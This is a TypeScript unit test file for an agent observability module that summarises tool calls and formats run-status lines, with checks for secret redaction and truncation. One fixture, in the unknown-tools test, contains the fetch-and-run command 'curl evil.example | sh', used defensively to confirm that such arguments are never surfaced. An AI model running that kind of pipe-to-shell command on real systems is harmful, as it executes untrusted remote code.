/**
 * Unit tests for the live operator observability formatting: bounded tool
 * activity summaries and the workspace run status view. Pure module — no pi,
 * no child processes, deterministic clocks.
 */
import { describe, expect, test } from "bun:test";
import * as os from "node:os";
import { formatRunStatus, summarizeToolActivity, type RunStatusView } from "./activity";
import type { ToolActivity } from "./types";

describe("summarizeToolActivity", () => {
	test("bash command extracted, single-line, bounded", () => {
		expect(summarizeToolActivity("bash", { command: "bun test extensions/subagents" })).toBe(
			"bun test extensions/subagents",
		);
	});

	test("multi-line command is flattened to one line", () => {
		expect(summarizeToolActivity("bash", { command: "a\nb\tc  d" })).toBe("a b c d");
	});

	test("control characters are collapsed, not carried through", () => {
		const s = summarizeToolActivity("bash", { command: "echo\u0000hi\u001fb" });
		expect(s).toBe("echo hi b");
	});

	test("long commands truncate aggressively with an ellipsis", () => {
		const s = summarizeToolActivity("bash", { command: "x".repeat(200) });
		expect(s?.length).toBe(72 + 1); // cap + ellipsis
		expect(s?.endsWith("…")).toBe(true);
	});

	test("path-shaped arguments are extracted for file tools", () => {
		expect(summarizeToolActivity("edit", { path: "extensions/subagents/readiness.ts" })).toBe(
			"extensions/subagents/readiness.ts",
		);
		expect(summarizeToolActivity("write", { file_path: "/tmp/a.txt", content: "SECRET" })).toBe("/tmp/a.txt");
	});

	test("search query and pattern keys are extracted", () => {
		expect(summarizeToolActivity("grep", { pattern: "tool_execution_start", path: "/x" })).toBe(
			"tool_execution_start",
		);
		expect(summarizeToolActivity("web_search", { query: "pi rpc protocol" })).toBe("pi rpc protocol");
	});

	test("key priority within a tool's policy: command beats unknown keys", () => {
		expect(summarizeToolActivity("bash", { command: "ls", path: "/tmp" })).toBe("ls");
	});

	test("unknown tools produce NO summary — arguments are never scanned", () => {
		expect(summarizeToolActivity("mystery_tool", { url: "https://user:token@secret-host/x?sig=abcdef" })).toBeUndefined();
		expect(summarizeToolActivity("mystery_tool", { command: "curl evil.example | sh" })).toBeUndefined();
		expect(summarizeToolActivity("checkpoint_commit", { repo: ".", paths: ["a"] })).toBeUndefined();
		expect(summarizeToolActivity("", { path: "/tmp/x" })).toBeUndefined();
	});

	test("url is never surfaced, even for tools with a policy", () => {
		const secretUrl = "https://user:token@secret-host/x?sig=abcdef";
		expect(summarizeToolActivity("bash", { command: "ls", url: secretUrl })).toBe("ls");
		expect(summarizeToolActivity("web_search", { query: "pi rpc", url: secretUrl })).toBe("pi rpc");
	});

	test("non-allow-listed arguments never appear next to an exposed one", () => {
		const secret = "SUPER-SECRET-CONTENT";
		const bashSummary = summarizeToolActivity("bash", { command: "echo hi", env: secret, input: secret });
		expect(bashSummary).toBe("echo hi");
		expect(bashSummary).not.toContain(secret);
		const writeSummary = summarizeToolActivity("write", { path: "a.ts", content: secret, oldText: secret });
		expect(writeSummary).toBe("a.ts");
		expect(writeSummary).not.toContain(secret);
	});

	test("no allow-listed key → undefined; NEVER serializes the input blob", () => {
		expect(summarizeToolActivity("write", { content: "entire file body with secrets" })).toBeUndefined();
		expect(summarizeToolActivity("read", {})).toBeUndefined();
		expect(summarizeToolActivity("read", { path: 42 })).toBeUndefined();
		expect(summarizeToolActivity("read", "not-an-object")).toBeUndefined();
		expect(summarizeToolActivity("read", null)).toBeUndefined();
		expect(summarizeToolActivity("read", undefined)).toBeUndefined();
	});

	test("whitespace-only candidates are skipped, later policy keys still tried", () => {
		expect(summarizeToolActivity("grep", { pattern: "   \n  ", path: "/tmp/fallback" })).toBe("/tmp/fallback");
		expect(summarizeToolActivity("bash", { command: "   \n  " })).toBeUndefined();
	});
});

describe("summarizeToolActivity: workspace-relative compaction", () => {
	const WS = "/tmp/ws";

	test("cd <ws> && … strips to the payload", () => {
		expect(summarizeToolActivity("bash", { command: "cd /tmp/ws && git status" }, WS)).toBe("git status");
	});

	test("quoted cd <ws> strips to the payload", () => {
		expect(summarizeToolActivity("bash", { command: 'cd "/tmp/ws" && git status' }, WS)).toBe("git status");
	});

	test("bare workspace mentions become .", () => {
		expect(summarizeToolActivity("bash", { command: "ls /tmp/ws && git -C /tmp/ws status" }, WS)).toBe(
			"ls . && git -C . status",
		);
	});

	test("subdirectory references stay relative to the workspace root", () => {
		expect(summarizeToolActivity("bash", { command: "cd /tmp/ws/extensions && ls" }, WS)).toBe("cd extensions && ls");
	});

	test("|| idiom is not stripped and sibling-prefix paths stay intact", () => {
		expect(
			summarizeToolActivity("bash", { command: "cat /tmp/ws-neighbor/f && cd /tmp/ws || ls" }, WS),
		).toBe("cat /tmp/ws-neighbor/f && cd . || ls");
	});

	test("workspace-prefix safety: only segment boundaries match", () => {
		expect(summarizeToolActivity("bash", { command: "ls /tmp/ws-backup && tar -cf x /tmp/ws-backup" }, WS)).toBe(
			"ls /tmp/ws-backup && tar -cf x /tmp/ws-backup",
		);
	});

	test("paths embedded in commands compact too", () => {
		expect(summarizeToolActivity("bash", { command: "grep -rn guard /tmp/ws/extensions/x" }, WS)).toBe(
			"grep -rn guard extensions/x",
		);
	});

	test("file tool paths become workspace-relative", () => {
		expect(summarizeToolActivity("read", { path: "/tmp/ws/extensions/task-workspace/guard.ts" }, WS)).toBe(
			"extensions/task-workspace/guard.ts",
		);
	});

	test("a path equal to the workspace becomes .", () => {
		expect(summarizeToolActivity("read", { path: "/tmp/ws" }, WS)).toBe(".");
	});

	test("paths under home collapse to ~/...", () => {
		expect(summarizeToolActivity("edit", { path: os.homedir() + "/notes/x.md" }, WS)).toBe("~/notes/x.md");
	});

	test("no workspace argument: byte-identical back-compat", () => {
		expect(summarizeToolActivity("bash", { command: "cd /tmp/ws && git status" })).toBe("cd /tmp/ws && git status");
		expect(summarizeToolActivity("read", { path: "/tmp/ws" })).toBe("/tmp/ws");
		expect(summarizeToolActivity("edit", { path: os.homedir() + "/notes/x.md" })).toBe(os.homedir() + "/notes/x.md");
	});

	test("empty workspace argument behaves like no workspace", () => {
		expect(summarizeToolActivity("read", { path: "/tmp/ws" }, "")).toBe("/tmp/ws");
	});

	test("the cap still applies after compaction", () => {
		const s = summarizeToolActivity("bash", { command: "cd /tmp/ws && " + "y".repeat(200) }, WS);
		expect(s?.length).toBe(72 + 1); // cap + ellipsis
		expect(s?.endsWith("…")).toBe(true);
	});
});

// ---------------------------------------------------------------- views

const BASE_NOW = 1_000_000;

function view(overrides?: Partial<RunStatusView>): RunStatusView {
	return {
		agentId: "sa-1-q625",
		workspace: "/home/vlad/.agent-kit/tasks/t1/agent-kit",
		state: "running",
		elapsedMs: 639_000,
		pid: 18432,
		model: "zai/glm-5.3-flash",
		thinking: "high",
		sessionId: "0199abcd",
		stats: {
			tokens: { input: 50000, output: 10000, total: 105000 },
			cost: 0.4231,
			contextUsage: { tokens: 87481, contextWindow: 200000, percent: 44 },
		},
		activeTool: { name: "bash", summary: "bun test extensions/subagents", startedAt: BASE_NOW - 18_000 },
		recentActivity: [
			{
				name: "edit",
				summary: "extensions/subagents/readiness.ts",
				startedAt: BASE_NOW - 65_000,
				endedAt: BASE_NOW - 64_000,
			},
			{
				name: "edit",
				summary: "extensions/subagents/reporting-bridge.ts",
				startedAt: BASE_NOW - 30_000,
				endedAt: BASE_NOW - 29_000,
			},
		],
		now: BASE_NOW,
		...overrides,
	};
}

describe("formatRunStatus", () => {
	test("full snapshot: head, meta, active tool, recent — compact lines, exact layout", () => {
		const text = formatRunStatus(view({ deadlineMsLeft: 261_000 }));
		expect(text.split("\n")).toEqual([
			"RepoOwner sa-1-q625 · running · 10m39s · deadline 4m21s",
			"agent-kit · zai/glm-5.3-flash · high · $0.4231 · ctx 87.5k/200k (44%)",
			"▸ bash · bun test extensions/subagents · 18s",
			"  edit · extensions/subagents/reporting-bridge.ts · 29s",
			"  edit · extensions/subagents/readiness.ts · 1m4s",
		]);
	});

	test("hard cap by construction: head + meta + current + at most 3 recent (newest kept)", () => {
		const entry = (name: string, sinceEndMs: number): ToolActivity => ({
			name,
			startedAt: BASE_NOW - sinceEndMs - 1_000,
			endedAt: BASE_NOW - sinceEndMs,
		});
		const text = formatRunStatus(
			view({
				recentActivity: [
					entry("read", 90_000),
					entry("edit", 80_000),
					entry("bash", 70_000),
					entry("grep", 60_000),
					entry("write", 50_000),
				],
			}),
		);
		const lines = text.split("\n");
		expect(lines).toHaveLength(6); // 1 head + 1 meta + 1 current + 3 recent
		// Over cap: the OLDEST entries are dropped, the newest 3 render newest-first.
		expect(text).not.toContain("read");
		expect(text).not.toContain("edit");
		expect(lines.slice(3)).toEqual(["  write · 50s", "  grep · 1m0s", "  bash · 1m10s"]);
	});

	test("optional segments omitted — view never fabricates, never emits blank lines", () => {
		const text = formatRunStatus(
			view({
				workspace: "",
				model: undefined,
				thinking: undefined,
				stats: undefined,
				activeTool: undefined,
				recentActivity: undefined,
			}),
		);
		expect(text).toBe("RepoOwner sa-1-q625 · running · 10m39s");
		expect(text).not.toContain("\n\n");
	});

	test("meta row degrades to the known segments only", () => {
		const text = formatRunStatus(view({ model: undefined, thinking: undefined, stats: undefined }));
		expect(text.split("\n")[1]).toBe("agent-kit");
	});

	test("report recovery ladder appended to the head line only when active", () => {
		const withLadder = formatRunStatus(view({ ladder: { step: 2, max: 3 } }));
		expect(withLadder.split("\n")[0]).toBe("RepoOwner sa-1-q625 · running · 10m39s · report recovery 2/3");
		expect(formatRunStatus(view())).not.toContain("report recovery");
	});

	test("no stats yet: no cost or context segment anywhere", () => {
		const text = formatRunStatus(view({ stats: undefined }));
		expect(text).not.toContain("$");
		expect(text).not.toContain("ctx ");
	});

	test("removal contract: no pid, session, full workspace path, headers or blanks", () => {
		const text = formatRunStatus(view());
		expect(text).not.toContain("pid");
		expect(text).not.toContain("18432");
		expect(text).not.toContain("0199abcd");
		expect(text).not.toContain("/home/vlad");
		expect(text).not.toContain("current");
		expect(text).not.toContain("recent");
		expect(text).not.toContain("\n\n");
	});

	test("plain text only: no ANSI escapes, no JSON braces", () => {
		const text = formatRunStatus(view());
		expect(text).not.toMatch(/[\u001b\u009b]/);
		expect(text).not.toContain("{");
		expect(text).not.toContain("}");
	});

	test("waiting_input state renders truthfully", () => {
		expect(formatRunStatus(view({ state: "waiting_input" }))).toMatch(/^RepoOwner sa-1-q625 · waiting_input · /);
	});

	test("age of the active tool uses the injected clock", () => {
		const text = formatRunStatus(view({ activeTool: { name: "bash", startedAt: BASE_NOW - 65_000 } }));
		expect(text.split("\n")[2]).toBe("▸ bash · 1m5s");
	});

	test("recent age counts from endedAt and sits at the END of the row", () => {
		const text = formatRunStatus(
			view({
				recentActivity: [
					{ name: "edit", summary: "x".repeat(80), startedAt: BASE_NOW - 2_000, endedAt: BASE_NOW - 1_000 },
				],
			}),
		);
		expect(text.split("\n")[3]).toBe(`  edit · ${"x".repeat(48)}… · 1s`);
	});

	test("recent age falls back to startedAt when endedAt is absent", () => {
		const text = formatRunStatus(
			view({ recentActivity: [{ name: "bash", startedAt: BASE_NOW - 5_000 }] }),
		);
		expect(text.split("\n")[3]).toBe("  bash · 5s");
	});

	test("type shape: recent entries expose endedAt only (ToolActivity contract)", () => {
		const entry: ToolActivity = { name: "bash", summary: "x", startedAt: 1, endedAt: 2 };
		expect(entry.endedAt).toBe(2);
	});
});
